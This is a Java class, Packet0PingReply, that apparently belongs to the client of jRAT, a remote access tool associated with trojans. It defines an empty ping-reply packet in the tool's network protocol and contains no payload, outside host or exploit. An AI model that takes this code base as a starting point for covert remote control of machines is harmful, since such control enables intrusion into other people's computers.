package jrat.client.packets.outgoing;

import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;

public class Packet0PingReply extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {

	}

	@Override
	public short getPacketId() {
		return (byte) 0;
	}

}
